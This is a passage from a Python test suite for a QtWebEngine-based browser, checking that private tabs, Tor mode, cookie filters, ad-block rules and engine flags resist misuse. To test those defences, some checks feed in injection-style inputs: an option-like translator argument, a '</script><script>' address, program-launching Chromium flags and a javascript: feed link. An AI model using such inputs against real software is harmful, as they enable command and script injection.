br.caption_tools = lambda: {"captionTranscriber": "/bin/true"}
_ff_was = br.config.get("ffmpegPath")
br.config["ffmpegPath"] = "/bin/true"
br._caption_job = lambda *a, **k: _jobs.append(a)
v21 = br.new_tab(); H.spin(300)
H.load(v21, srv.url("/vidfile")); H.spin(800)
br.make_captions(view=v21, then=_said_cap.append)
H.wait_for(lambda: _said_cap, 4000)
check("a page's file:// video is not handed to ffmpeg",
      _jobs == [] and _said_cap == [{"refused": True}], str((_jobs, _said_cap)))
for _n in ("caption_tools", "_caption_job"):
    br.__dict__.pop(_n, None)
br.config["ffmpegPath"] = _ff_was

# "block third-party cookies" holds in a jar made after it was switched on.
# (Asked of the filter itself: over plain http the engine's own SameSite
# default already refuses a cross-site frame's cookie, so the cookie alone
# cannot show whether the filter is there.)
_asked_tp = []
def _rec_filter(request):
    _asked_tp.append((request.firstPartyUrl.toString(), request.thirdParty))
    return True
br._cookie_wanted = _rec_filter
br.config["blockThirdCookies"] = True
br.apply_cookie_filter()
_tpv = br.new_tab(session="tpcookievb"); H.spin(400)
H.load(_tpv, srv.url("/tpframe?latejar=1")); H.spin(1500)
check("the third-party cookie filter is asked in a jar made later",
      any("latejar" in u and third for u, third in _asked_tp),
      str(len(_asked_tp)))
br.__dict__.pop("_cookie_wanted", None)
br.config["blockThirdCookies"] = False
br.apply_cookie_filter()

# the Tor window really goes through Tor: what its own start-up makes of
# its config is a SOCKS proxy, and WebRTC is off in it
import subprocess as _sp
_tor_dir = _xdir / "tor-profile"
_tc = br._prepare_tor_profile(_tor_dir)
check("the Tor profile names Tor as its proxy",
      B._proxy_launch_flags(dict(_tc)) == "--proxy-server=socks5://127.0.0.1:9050",
      B._proxy_launch_flags(dict(_tc)))
_env = dict(_os.environ, BROWSER_HOME=str(_tor_dir),
            QT_QPA_PLATFORM="offscreen",
            QTWEBENGINE_CHROMIUM_FLAGS=br.tor_command()["env"]
            ["QTWEBENGINE_CHROMIUM_FLAGS"])
_child = _sp.run([B.sys.executable, "-c",
                  "import os,sys; sys.argv=['x']; import browser as B; "
                  "B._install_proxy_flags(); "
                  "print(os.environ['QTWEBENGINE_CHROMIUM_FLAGS'])"],
                 cwd=str(B.APP_DIR), env=_env, capture_output=True,
                 text=True, timeout=60)
check("...and the Tor window's own start-up keeps it",
      "--proxy-server=socks5://127.0.0.1:9050" in _child.stdout,
      _child.stdout[-200:] or _child.stderr[-200:])
check("...with WebRTC switched off there",
      _tc.get("guardNoWebRTC") is True)
check("...and kept off at the engine, where the page's own iframe cannot "
      "bring it back",
      "--force-webrtc-ip-handling-policy=disable_non_proxied_udp"
      in B._privacy_flags(dict(_tc)), str(B._privacy_flags(dict(_tc))))

# the in-page answer bars answer his clicks, not the page's
v22 = br.new_tab(); H.spin(300)
H.load(v22, srv.url("/twhome")); H.spin(500)
br.tabs.setCurrentWidget(v22); H.spin(100)
br.offer_fullscreen_rule("127.0.0.1", view=v22); H.spin(400)
H.js(v22, "var b=document.querySelector('#__fsbar button');"
          "b && b.click(); !!b")
H.spin(1200)
check("a page pressing 'keep' on the fullscreen bar earns nothing",
      br.fullscreen_rule("127.0.0.1") is None,
      str(br.fullscreen_rule("127.0.0.1")))
br.offer_translation_bar("fr", view=v22); H.spin(400)
H.js(v22, "var bs=document.querySelectorAll('#__trbar button');"
          "bs.length > 1 && bs[1].click(); bs.length")
H.spin(1200)
check("...nor 'always' on the translation bar",
      "fr" not in br.translate_rules(), str(br.translate_rules()))

# "always translate" does not send a private tab's page to Google by itself
_sent_tr = []
_tp_was = br._translate_page
br._translate_page = lambda lang, view=None: _sent_tr.append(lang)
_ct2 = br.caption_tools
br.caption_tools = lambda: {"captionTranslator": ""}
_rules_was = dict(br.translate_rules())
br.config["translateRules"] = {"fr": "always"}
_pv5 = br.new_private_tab(); H.spin(300)
H.load(_pv5, srv.url("/fr")); H.spin(1500)
br.maybe_offer_translation(_pv5); H.spin(800)
check("a private tab's page is not sent to the translator by itself",
      _sent_tr == [], str(_sent_tr))
br.__dict__.pop("_translate_page", None)
br.__dict__.pop("caption_tools", None)
br.config["translateRules"] = _rules_was

# a workspace keeps the ordinary tabs, never a private one
_pv6 = br.new_private_tab(); H.spin(300)
H.load(_pv6, srv.url("/twother?ws-private")); H.spin(600)
_ws_was = dict(br.workspaces())
_saved_ws = br.save_workspace("review-ws")
check("saving a workspace leaves the private tab out",
      _saved_ws is not False
      and not any("ws-private" in r["u"] for r in _saved_ws), str(_saved_ws)[:200])
br.config["workspaces"] = _ws_was
br.config["workspaceNow"] = ""

# "reddit.com -> old.reddit.com" means the site, once: not www.old.,
# not notreddit.com, and never old.old.reddit.com in a loop
_rw_was = br.config.get("urlRewrites")
br.config["urlRewrites"] = ["reddit.com -> old.reddit.com"]
_rw = lambda u: br.rewrite_url(B.QUrl(u)).toString()
check("a host rule takes the site to the new host",
      _rw("https://www.reddit.com/r/x") == "https://old.reddit.com/r/x"
      and _rw("https://reddit.com/r/y") == "https://old.reddit.com/r/y",
      str((_rw("https://www.reddit.com/r/x"), _rw("https://reddit.com/r/y"))))
check("...and leaves the new host alone (no rewrite loop)",
      _rw("https://old.reddit.com/r/x") == "https://old.reddit.com/r/x",
      _rw("https://old.reddit.com/r/x"))
check("...and a look-alike host alone",
      _rw("https://notreddit.com/") == "https://notreddit.com/",
      _rw("https://notreddit.com/"))
br.config["urlRewrites"] = _rw_was

# live captions listen to the machine's output, not the microphone, and
# what they say is never put into the page
_cp = br._caption_record_args("/usr/bin/parec", "/tmp/x.wav", 3)
_cf = br._caption_record_args("/usr/bin/ffmpeg", "/tmp/x.wav", 3)
check("live captions record the output's monitor",
      "--device=@DEFAULT_MONITOR@" in _cp
      and _cf[_cf.index("-i") + 1] == "@DEFAULT_MONITOR@", str((_cp, _cf)))
br.caption_overlay("words from a call in another program", view=v15)
H.spin(200)
check("...and the caption line is the browser's, not the page's",
      br.caption_text(v15) == "words from a call in another program"
      and H.js(v15, "!!document.getElementById('__captions')") is False)
br.caption_overlay("", view=v15, clear=True)

# page text handed to a translator can never be read as one of its options
class _FakeProc2:
    started = []
    def __init__(self, *a, **k): pass
    def start(self, prog, args): _FakeProc2.started.append([prog] + list(args))
    class _Sig:
        def connect(self, *a): pass
    finished = _Sig()
    errorOccurred = _Sig()
    class ProcessState:
        NotRunning = 0
    def state(self): return 0
    def deleteLater(self): pass     # the translator's process goes when done
_real_qp2 = B.QProcess
B.QProcess = _FakeProc2
for _tool in ("/usr/bin/trans", "/usr/bin/argos-translate", "/opt/mytr"):
    br.caption_tools = lambda t=_tool: {"captionTranslator": t,
                                        "captionRecorder": "",
                                        "captionTranscriber": ""}
    br.run_translator("--output=/tmp/review-pwned")
B.QProcess = _real_qp2
br.__dict__.pop("caption_tools", None)
check("a paragraph that looks like an option is not one",
      len(_FakeProc2.started) == 3
      and all(not row[-1].startswith("-") for row in _FakeProc2.started),
      str(_FakeProc2.started))

# deleting history takes what was kept about those pages with it
_hw = list(br.history)
_pi_was = br.config.get("pageIndex")
br.history[:] = [{"url": "https://gone.example/p", "title": "g", "t": 5},
                 {"url": "https://kept.example/q", "title": "k", "t": 6}]
br.config["pageIndex"] = {"https://gone.example/p": "secret words",
                          "https://kept.example/q": "other words"}
_th = br.thumbs_dir() / (br._thumb_name("https://gone.example/p") + ".png")
_th.parent.mkdir(parents=True, exist_ok=True)
_th.write_bytes(b"png")
br.delete_history_entries(["https://gone.example/p"])
check("deleting a page from the history drops its indexed words and picture",
      list(br.config.get("pageIndex") or {}) == ["https://kept.example/q"]
      and not _th.exists(), str(br.config.get("pageIndex")))
br.clear_history(undoable=False)
check("...and clearing the history drops the whole index",
      not br.config.get("pageIndex"), str(br.config.get("pageIndex")))
_now = int(B.time.time())
br.history[:] = [{"url": "https://old.example/a", "title": "a", "t": _now - 90 * 86400},
                 {"url": "https://again.example/b", "title": "b", "t": _now - 90 * 86400},
                 {"url": "https://again.example/b", "title": "b", "t": _now}]
br.config["pageIndex"] = {"https://old.example/a": "old words",
                          "https://again.example/b": "read again"}
br.prune_history(30)
check("pruning drops the words of a page gone from the history, not of one "
      "read again since", list(br.config["pageIndex"]) ==
      ["https://again.example/b"], str(br.config.get("pageIndex")))
br.history[:] = [{"url": "https://hour.example/c", "title": "c", "t": _now - 60}]
br.config["pageIndex"]["https://hour.example/c"] = "this hour"
br.delete_history_range(since=_now - 3600)
check("...and 'delete the last hour' drops that hour's words",
      "https://hour.example/c" not in br.config["pageIndex"],
      str(br.config.get("pageIndex")))
br.history[:] = _hw
br.config["pageIndex"] = _pi_was or {}

# mono / balance never silence a video from another origin
v23 = br.new_tab(); H.spin(300)
H.load(v23, srv.url("/twovids")); H.spin(800)
_a11y_was = dict(br.config.get("a11y") or {})
br.config.setdefault("a11y", {})["monoAudio"] = True
br.apply_audio_shape(); H.spin(500)
check("a same-origin video is shaped, a cross-origin one is left as it is",
      H.js(v23, "!!document.getElementById('same').__shape") is True
      and H.js(v23, "document.getElementById('other').__shape === undefined")
      is True, str((H.js(v23, "!!document.getElementById('same').__shape"),
                    H.js(v23, "!!document.getElementById('other').__shape"))))
br.config["a11y"] = _a11y_was

# a page's address cannot close the error page's script
_eh = br.error_page_html("http://x.example/</script><script>window.__p=1"
                         "</script>", "boom")
check("an address with </script> in it stays inside the error page's script",
      "</script><script>window.__p" not in _eh, _eh[-300:])

# a site he never records in one virtual browser is not recorded in a tab
# of that browser, whichever browser is in front
v24 = br.new_tab(); H.spin(300)
H.load(v24, srv.url("/twhome")); H.spin(500)
_sess_was = getattr(v24, "session", None)
v24.session = "work"
_nh_was = br.config.get("noHistoryPerSession")
_hist_was, _act_was = list(br.history), br.active_session
br.config["noHistoryPerSession"] = {"work": ["127.0.0.1"]}
br.active_session = "main"
_n = len(br.history)
br._title_changed(v24, "never written")
check("never-record follows the tab's own virtual browser",
      not any(e.get("title") == "never written" for e in br.history),
      str(br.history[-1:]))
br.config["noHistoryPerSession"] = {}
br._title_changed(v24, "written with its browser")
_last = [e for e in br.history if e.get("title") == "written with its browser"]
check("...and the history labels the page with the tab's browser",
      bool(_last) and _last[-1].get("s") == "work", str(_last))
br.history[:] = _hist_was
br.active_session = _act_was
v24.session = _sess_was
if _nh_was is None:
    br.config.pop("noHistoryPerSession", None)
else:
    br.config["noHistoryPerSession"] = _nh_was

# what is kept or copied is the page's title, not the strip's label
v25 = br.new_tab(); H.spin(300)
H.load(v25, srv.url("/twhome"))
# the page itself and its title (H.load can return on the start page's
# load, and the title was still "New tab")
H.wait_for(lambda: "twhome" in v25.url().toString() and v25.title() == "tw",
           10000)
br.tabs.setCurrentWidget(v25); H.spin(100)
_i25 = br.tabs.indexOf(v25)
v25.page().setAudioMuted(True); br._refresh_tab_label(v25); H.spin(100)
_marked = br.tabs.tabText(_i25)
_md = br.copy_link_as("markdown")
_bm_was = list(br.bookmarks)
br.add_bookmark_here(0)
_bm = br.bookmarks[-1] if len(br.bookmarks) > len(_bm_was) else {}
check("a muted tab is bookmarked and copied by its page title",
      _marked.startswith(br.MUTE_MARK) and _bm.get("title") == "tw"
      and _md.startswith("[tw]"), str((_marked, _bm.get("title"), _md)))
br.bookmarks[:] = _bm_was
br.save_bookmarks()
v25.page().setAudioMuted(False); br._refresh_tab_label(v25)
br.pin_tab(br.tabs.indexOf(v25), on=True); H.spin(200)
_st = [e for e in br.tab_state() if e.get("u") == v25.url().toString()]
check("...and a pinned one keeps its title in the saved session",
      br.tabs.tabText(br.tabs.indexOf(v25)) == "" and _st
      and _st[0].get("t") == "tw", str(_st))
br.pin_tab(br.tabs.indexOf(v25), on=False)

# the wizard's "switch it off again" only undoes the wizard's own
# master password, never one he set before and has unlocked
if not br.vault_lock.enabled():
    br._master_by_wizard = False
    _on = br.vault_lock.enable("review-pass-1234")
    br.vault = br.make_vault()
    _after = br.clear_setup_master()
    check("the wizard cannot take off a master password it did not set",
          _on and br.vault_lock.enabled(), str(_after))
    br.vault_lock.disable(); br.vault = br.make_vault()
    _set = br.setup_master("review-pass-5678")
    br.clear_setup_master()
    check("...but does take off the one it set itself",
          _set.get("set") is True and not br.vault_lock.enabled(),
          str((_set, br.vault_lock.enabled())))
    if br.vault_lock.enabled() and not br.vault_lock.locked():
        br.vault_lock.disable()
    br.vault = br.make_vault()

# handing a site to the outside browser never takes a private tab's link
# out of private browsing
_launched = []
_cfg_was = {k: br.config.get(k) for k in ("externalHandoff", "externalSites")}
br.config["externalHandoff"] = True
br.config["externalSites"] = ["handoff.example"]
br._external_which = lambda cmd: "/bin/true"
br._launch_external = lambda cmd, url: _launched.append(url) or True
class _PrivTab:
    private = True
_NT = B.QWebEnginePage.NavigationType
_r_priv = br.maybe_open_external(B.QUrl("https://handoff.example/in"),
                                 _NT.NavigationTypeLinkClicked, _PrivTab())
_r_norm = br.maybe_open_external(B.QUrl("https://handoff.example/in"),
                                 _NT.NavigationTypeLinkClicked, None)
check("a private tab's link is not handed to the outside browser",
      _r_priv is False and _r_norm is True and len(_launched) == 1,
      str((_r_priv, _r_norm, _launched)))
del br._external_which, br._launch_external
for _k, _v in _cfg_was.items():
    if _v is None:
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v

# the Discord routing takes his links, not a page's script, and never a
# private tab's
def _route(**kw):
    try:
        return br.discord_route(srv.url("/twhome"), host="127.0.0.1", **kw)
    except TypeError as _e:
        return "error: %s" % _e
br.config["discordRoute"] = True
_r_script = _route(nav_type=_NT.NavigationTypeOther)
_r_back = _route(nav_type=_NT.NavigationTypeBackForward)
_r_priv = _route(from_view=_PrivTab(), nav_type=_NT.NavigationTypeLinkClicked)
_r_link = _route(nav_type=_NT.NavigationTypeLinkClicked)
check("a page's script cannot push an address into the Discord tab",
      _r_script is False and _r_back is False, str((_r_script, _r_back)))
check("...nor a private tab's link, while his own link still goes there",
      _r_priv is False and _r_link is True, str((_r_priv, _r_link)))
br.config["discordRoute"] = False

# the engine's launch flags: one of each repeated switch, and resolver
# rules that survive Qt splitting the variable at spaces
_mf = getattr(B, "_merge_engine_flags", lambda t: t)
_fl = getattr(B, "_flag", lambda n, v: "%s=%s" % (n, v))
_merged = _mf('--x --enable-features=A --disable-features=C '
              '--enable-features=B,A --host-resolver-rules="MAP a 0.0.0.0" '
              '--disable-features=D --host-resolver-rules="MAP b 1.2.3.4" --y')
check("repeated feature and resolver switches are folded into one each",
      _merged.count("--enable-features=") == 1
      and "--enable-features=A,B" in _merged
      and "--disable-features=C,D" in _merged
      and _merged.count("--host-resolver-rules=") == 1
      and '--host-resolver-rules="MAP a 0.0.0.0,MAP b 1.2.3.4"' in _merged
      and "--x" in _merged and "--y" in _merged, _merged)
check("a blocked site's resolver rule is quoted",
      any(f.startswith('--host-resolver-rules="MAP ads.example 0.0.0.0')
          for f in B._privacy_flags({"blockHosts": ["ads.example"]})),
      str(B._privacy_flags({"blockHosts": ["ads.example"]})))
# ...and measured in an engine of its own: a name mapped by one rule
# still loads with a block list and encrypted DNS beside it, and the
# renderer is told about both features, not only the last one
_child_py = _xdir / "flagchild.py"
_child_py.write_text(r"""
import os, sys, glob
os.environ["QT_QPA_PLATFORM"] = "offscreen"
from PyQt6.QtCore import QTimer, QUrl
from PyQt6.QtWidgets import QApplication
from PyQt6.QtWebEngineWidgets import QWebEngineView
app = QApplication(["x"])
v = QWebEngineView(); v.resize(200, 200); v.show()
me = os.getpid()
def anc(pid):
    for _ in range(8):
        try:
            pp = [l for l in open("/proc/%d/status" % pid) if l.startswith("PPid:")]
        except OSError:
            return False
        pid = int(pp[0].split()[1])
        if pid == me:
            return True
        if pid <= 1:
            return False
    return False
def done(ok):
    feats = ""
    for d in glob.glob("/proc/[0-9]*"):
        try:
            text = open(d + "/cmdline", "rb").read().replace(b"\0", b" ").decode("utf-8", "replace")
        except OSError:
            continue
        if "--type=renderer" in text and anc(int(d.split("/")[-1])):
            feats = " ".join(t for t in text.split() if t.startswith("--enable-features"))
            break
    print("RESULT", v.title(), feats)
    app.quit()
v.loadFinished.connect(done)
v.load(QUrl(sys.argv[1]))
QTimer.singleShot(20000, app.quit)
app.exec()
""")
_port = B.QUrl(srv.url("/twhome")).port()
_env_flags = _mf(" ".join([
    _fl("--host-resolver-rules", "MAP mapped-review.test 127.0.0.1"),
    " ".join(B._privacy_flags({"blockHosts": ["blocked-review.test"],
                               "doh": True,
                               "dohUrl": "https://dns.example/dns-query"})),
    "--enable-features=PlatformHEVCDecoderSupport"]))
_res = _sp.run([B.sys.executable, str(_child_py),
                "http://mapped-review.test:%d/twhome" % _port],
               env=dict(_os.environ, QTWEBENGINE_CHROMIUM_FLAGS=_env_flags),
               capture_output=True, text=True, timeout=90)
_line = ([l for l in _res.stdout.splitlines() if l.startswith("RESULT")]
         or [""])[0]
check("a mapped name loads beside a block list in a real engine",
      _line.startswith("RESULT tw "), _line or _res.stderr[-300:])
check("...and the renderer gets every feature asked for",
      "PlatformHEVCDecoderSupport" in _line and "DnsOverHttps" in _line,
      _line[-300:])
# the curated flags in Settings reach the next start
_sf_was = br.config.get("safeFlags")
br.config["safeFlags"] = ["--enable-zero-copy", "--evil-flag"]
br.save_config()
_sf = B._startup_flags()
check("a curated flag he switched on is put on the engine at start",
      "--enable-zero-copy" in _sf and "--evil-flag" not in _sf, _sf)
if _sf_was is None:
    br.config.pop("safeFlags", None)
else:
    br.config["safeFlags"] = _sf_was
br.save_config()
# an in-app restart hands the next run the flags this one was given
_seen_flags = []
_sd, _inst = B.QProcess.startDetached, B.QApplication.instance
_flags_was = _os.environ.get("QTWEBENGINE_CHROMIUM_FLAGS")
_wait_was = _os.environ.get("BROWSER_RESTART_WAIT")
_srv_was = getattr(br, "_instance_server", None)
class _NoQuit:
    def quit(self):
        pass
try:
    br._instance_server = None
    B.QProcess.startDetached = staticmethod(
        lambda *a, **k: _seen_flags.append(
            _os.environ.get("QTWEBENGINE_CHROMIUM_FLAGS") or "") or True)
    B.QApplication.instance = staticmethod(lambda: _NoQuit())
    _os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = (
        (_flags_was or "") + " --dns-over-https-mode=secure")
    br.restart()
finally:
    B.QProcess.startDetached, B.QApplication.instance = _sd, _inst
    br._instance_server = _srv_was
    if _flags_was is None:
        _os.environ.pop("QTWEBENGINE_CHROMIUM_FLAGS", None)
    else:
        _os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = _flags_was
    if _wait_was is None:
        _os.environ.pop("BROWSER_RESTART_WAIT", None)
    else:
        _os.environ["BROWSER_RESTART_WAIT"] = _wait_was
check("an in-app restart does not carry a switched-off flag into the next run",
      _seen_flags and "dns-over-https-mode" not in _seen_flags[0],
      str(_seen_flags))

# a page tool's paint follows the theme, the text he inserts does not
v26 = br.new_tab(); H.spin(300)
H.load(v26, srv.url("/twhome")); H.spin(500)
H.js(v26, "var i=document.createElement('input');i.id='tq';"
          "document.body.appendChild(i);i.focus();true")
_theme_was = B.ACTIVE_THEME
_other = [k for k in B.THEME_INDEX if k != B.DEFAULT_THEME][0]
_text = "#0d0d12 and rgb(205, 214, 244)"
try:
    B.ACTIVE_THEME = _other
    _changed = B.tint_js("x='#0d0d12'") != "x='#0d0d12'"
    br.desk_tool("insert", view=v26, arg=_text); H.spin(400)
finally:
    B.ACTIVE_THEME = _theme_was
_val = H.js(v26, "document.getElementById('tq').value")
check("text inserted into a field is not recoloured by the theme",
      _changed and _val == _text, str((_changed, _val)))

# what he typed on a site is not offered back to it in a private tab
_fh_on = br.config.get("formHistoryOn")
br.config["formHistoryOn"] = True
_fh = br.form_history()
_fh_was = dict(_fh)
# kept by origin since fix254 (a host-only row is offered to https only)
_fh[br._form_origin(B.QUrl(srv.url("/")))] = {"who": ["me@example.invalid"]}
_pv = br.new_tab(private=True); H.spin(300)
H.load(_pv, srv.url("/twhome")); H.spin(500)
_offered_priv = br.offer_form_history(view=_pv)
_offered_norm = br.offer_form_history(view=v26)
check("a private tab is not handed his form history for the site",
      _offered_priv is False and _offered_norm is True,
      str((_offered_priv, _offered_norm)))
_fh.clear(); _fh.update(_fh_was)
if _fh_on is None:
    br.config.pop("formHistoryOn", None)
else:
    br.config["formHistoryOn"] = _fh_on

# a feed's own links are web links or nothing
v27 = br.new_tab(); H.spin(300)
H.load(v27, srv.url("/feedjs.xml")); H.spin(600)
br.read_page_tool("renderfeed", view=v27, arg=False); H.spin(500)
_hrefs = H.js(v27, "Array.prototype.map.call(document.querySelectorAll('a'),"
                   "function(a){return a.getAttribute('href')||''}).join('|')")
check("a feed item's javascript: link is not made a link",
      isinstance(_hrefs, str) and "javascript" not in _hrefs.lower()
      and "https://ok.example/1" in _hrefs, str(_hrefs))

# the words he blurs while streaming are not handed to the page
v28 = br.new_tab(); H.spin(300)
H.load(v28, srv.url("/hooked")); H.spin(500)
br.play_tool("blurprivate", view=v28, arg=["Qwsecretname"]); H.spin(400)
_seen = H.js(v28, "JSON.stringify(window.__seen || [])") or "[]"
_blurred = H.js(v28, "document.getElementById('w').dataset.blurred || ''")
check("the stream-safe words never pass through the page's own functions",
      '"Qwsecretname"' not in _seen and _blurred == "1",
      str((_seen[:200], _blurred)))
br.play_tool("blurprivate", view=v28, arg=False)

# a private tab's cookies stay out of the browser-wide lists
_pk = br.new_tab(private=True); H.spin(300)
H.load(_pk, srv.url("/privck"))
H.wait_for(lambda: any("privonly_review" in str(k)
                       for k in (getattr(br, "_cookie_seen", None) or {})),
           8000)
_names = [n for n, _d, _e in br.known_cookies()]
_rows = [r["host"] for r in br.site_data_rows()
         if "privonly_review" in r.get("names", [])]
_seen_priv = [k for k in (getattr(br, "_cookie_seen", None) or {})
              if "privonly_review" in str(k)]
check("a private tab's cookie is not in the site data or the bridge's list",
      "privonly_review" not in _names and not _rows and _seen_priv,
      str((_names[-5:], _rows, _seen_priv)))
_pjar = br.session_profiles.get(B.PRIVATE_SESSION)
for _t in (br._live_views_on(_pjar) if _pjar is not None else []):
    _ix = br.tabs.indexOf(_t)
    if _ix >= 0:
        br.close_tab(_ix, ask=False)
    else:
        _t._closed = True       # a private view outside this strip
H.spin(600)
br._drop_private_profile(); H.spin(300)
check("...and the cookie editor forgets that jar's rows when it goes",
      not any(str(k).startswith("private|")
              for k in (getattr(br, "_cookie_seen", None) or {})), str([k for k in (getattr(br, "_cookie_seen", None) or {})
                           if str(k).startswith("private|")][:3]))

# one odd line in a filter list no longer switches all hiding off, and a
# brace in a list cannot put a stylesheet of its own on the page
_lists = B.adblock.Rules()
_lists.load_text("##.good\n##.bad:style(color: red)\n"
                 "##x{}#n{display: none}y\n")
_ar, _ao = br.ad_rules, br.ad_block_on
br.ad_rules = lambda: _lists
br.ad_block_on = lambda host=None: True
try:
    v29 = br.new_tab(); H.spin(300)
    H.load(v29, srv.url("/adpage")); H.spin(500)
    br.apply_ad_css(v29); H.spin(400)
    _hid = H.js(v29, "getComputedStyle(document.getElementById('g')).display")
    _col = H.js(v29, "getComputedStyle(document.getElementById('n')).display")
finally:
    br.ad_rules, br.ad_block_on = _ar, _ao
check("a list's hiding rules still hide beside one the engine cannot read",
      _hid == "none", str(_hid))
check("...and a list cannot slip its own CSS onto the page",
      _col != "none", str(_col))

# a filter rule is found for every address it matches, not only for
# those whose words happen to line up with the rule's
_net = B.adblock.Rules()
_net.load_text("adserver.example\n/promoimg\n")
check("a rule whose word sits at its edge still blocks a longer word",
      bool(_net.blocks("https://myadserver.example/x"))
      and bool(_net.blocks("https://x.test/promoimgs/a.png")),
      str((_net.blocks("https://myadserver.example/x"),
           _net.blocks("https://x.test/promoimgs/a.png"))))

# what a recording heard is kept beside it, or not at all -- never in the
# config folder
import glob as _glob, shutil as _shutil
_touch = _shutil.which("touch")
_tools_was = br.record_tools
br.record_tools = lambda: {"recorder": _touch, "ffmpeg": ""}
v30 = br.new_tab(); H.spin(300)
H.load(v30, srv.url("/twhome")); H.spin(500)
br.tabs.setCurrentWidget(v30); H.spin(100)
br.start_recording(view=v30, fps=5, audio=True); H.spin(900)
_out = br.stop_recording(save=True, fmt="gif"); H.spin(300)
_cfg_wavs = _glob.glob(str(B.CONFIG_FILE.parent / "recording-*.wav"))
_beside = bool(_out) and _Path(_out).with_suffix(".wav").exists()
br.start_recording(view=v30, fps=5, audio=True); H.spin(600)
_rec_wav = br.recording_now().audio_path if br.recording_now() else ""
br.stop_recording(save=False); H.spin(300)
br.__dict__.pop("record_tools", None)
check("a recording's sound is kept beside it, and none in the config folder",
      _beside and not _cfg_wavs, str((_out, _cfg_wavs)))
check("...and a recording thrown away takes its sound with it",
      bool(_rec_wav) and not _Path(_rec_wav).exists(), _rec_wav)

# a word looked up in a private tab is looked up in a private tab: not in
# the panel's ordinary jar, and not kept in config.json
_pt = br.new_tab(private=True); H.spin(300)
H.load(_pt, srv.url("/twhome")); H.spin(500)
H.js(_pt, "var r=document.createRange();r.selectNodeContents(document.body);"
          "var s=getSelection();s.removeAllRanges();s.addRange(r);1",
     B.MAIN_WORLD_ID)
_opened, _paneled = [], []
_nt, _op = br.new_tab, br.open_panel
_pu_was = br.config.get("panelUrl")
br.new_tab = lambda *a, **k: _opened.append(k) or object()
br.open_panel = lambda url: _paneled.append(url) or True
try:
    br.translate_selection(view=_pt); H.spin(500)
    br.tabs.setCurrentWidget(_pt); H.spin(100)
    _refused = getattr(br, "_page_to_panel", lambda: "missing")()
finally:
    br.new_tab, br.open_panel = _nt, _op
    br.__dict__.pop("new_tab", None); br.__dict__.pop("open_panel", None)
check("a private tab's translation opens in a private tab, not the panel",
      _opened and _opened[0].get("private") is True and not _paneled
      and br.config.get("panelUrl") == _pu_was, str((_opened, _paneled)))
check("...and a private page is not put into the panel",
      _refused is False and not _paneled, str(_paneled))
_ix = br.tabs.indexOf(_pt)
if _ix >= 0:
    br.close_tab(_ix, ask=False)

# housekeeping runs once while he is away, not on every idle tick
_hk_cleared = []
_hk_profiles = br._all_profiles
class _CacheProbe:
    def clearHttpCache(self):
        _hk_cleared.append(1)
br._all_profiles = lambda profile=None: [_CacheProbe()]
_idle_was = getattr(br, "_idle_since", 0)
br.__dict__.pop("_housekept", None)
br._idle_since = B.time.time() - 600
try:
    br.housekeeping(); br.housekeeping(); br.housekeeping()
finally:
    br.__dict__.pop("_all_profiles", None)
    br._idle_since = _idle_was
check("housekeeping clears the cache once per stretch of idleness",
      len(_hk_cleared) == 1, str(len(_hk_cleared)))

# "cache in memory only" holds on a jar made later, and comes back after
# the developer's cache switch
_ck = B.QWebEngineProfile.HttpCacheType
_cs_was = (br.config.get("cacheSize"), br.config.get("cacheMemoryOnly"))
br.set_cache_size(0, memory_only=True)
_later = br._session_profile("cachelater")
_later_kind = _later.httpCacheType()
v31 = br.new_tab(); H.spin(300)
H.load(v31, srv.url("/twhome")); H.spin(300)
br.cache_off(view=v31, on=True)
br.cache_off(view=v31, on=False)
_back_kind = v31.page().profile().httpCacheType()
br.set_cache_size(_cs_was[0] or 0, memory_only=bool(_cs_was[1]))
check("memory-only cache holds on a virtual browser made afterwards",
      _later_kind == _ck.MemoryHttpCache, str(_later_kind))
check("...and comes back after the developer's no-cache switch",
      _back_kind == _ck.MemoryHttpCache, str(_back_kind))

# lite mode's "no images" holds past the next page
_lite_was = br.config.get("liteMode", False)
v32 = br.new_tab(); H.spin(300)
H.load(v32, srv.url("/twhome")); H.spin(300)
br.lite_mode(on=True)
H.load(v32, srv.url("/twother")); H.spin(500)
_img_on = v32.page().settings().testAttribute(
    B.QWebEngineSettings.WebAttribute.AutoLoadImages)
br.lite_mode(on=_lite_was)
check("lite mode keeps images off after the tab goes to another page",
      _img_on is False, str(_img_on))

# an "&" in a bookmark's name is shown, not taken for a menu shortcut
_amp_entry = {"id": 999901, "type": "link", "title": "AT&T", "parent": 0,
              "url": "https://att.example/", "icon": ""}
_amp_btn = B.BookmarkButton(br, _amp_entry)
_amp_menu = B.QMenu()
br._fill_entries(_amp_menu, [_amp_entry], 0)
check("a bookmark called AT&T keeps its & on the bar and in the menu",
      _amp_btn.text() == "AT&&T" and _amp_menu.actions()[0].text() == "AT&&T",
      str((_amp_btn.text(), _amp_menu.actions()[0].text())))
_amp_btn.deleteLater()

# a muted tab put off as a to-do is written down by its page title
v33 = br.new_tab(); H.spin(300)
H.load(v33, srv.url("/twhome"))
# the page itself, not the start page's load (H.load can return on that)
H.wait_for(lambda: "twhome" in v33.url().toString() and v33.title() == "tw",
           8000)
v33.page().setAudioMuted(True); br._refresh_tab_label(v33); H.spin(100)
_todo_rows = br.tab_to_todo(index=br.tabs.indexOf(v33), close=True) or []
_todo_texts = [r.get("text") for r in _todo_rows]
check("a muted tab's to-do is called by its page title",
      "tw" in _todo_texts and not any(str(t).startswith(br.MUTE_MARK)
                                      for t in _todo_texts), str(_todo_texts))

# zooming in a private tab writes no site into the zoom table
_zs_was = dict(br.config.get("zoomSites") or {})
br.config["zoomSites"] = {}
_pz = br.new_tab(private=True); H.spin(300)
H.load(_pz, srv.url("/twhome")); H.spin(400)
br.tabs.setCurrentWidget(_pz); H.spin(100)
br.zoom_by(1); H.spin(100)
_zoom_rows = dict(br.config.get("zoomSites") or {})
br.config["zoomSites"] = _zs_was
_ix = br.tabs.indexOf(_pz)
if _ix >= 0:
    br.close_tab(_ix, ask=False)
check("zooming a private tab leaves no site in the zoom table",
      not _zoom_rows, str(_zoom_rows))

# a flag line that would start a program of its own never reaches the engine
_cf_was = br.config.get("chromiumFlags")
br.config["chromiumFlags"] = ("--renderer-cmd-prefix=/bin/true\n"
                              "--lang=de --gpu-launcher=/bin/true\n"
                              "--disable-gpu-vsync")
br.save_config()
_flags_now = B._startup_flags()
if _cf_was is None:
    br.config.pop("chromiumFlags", None)
else:
    br.config["chromiumFlags"] = _cf_was
br.save_config()
check("his own flags may not start a program for every renderer",
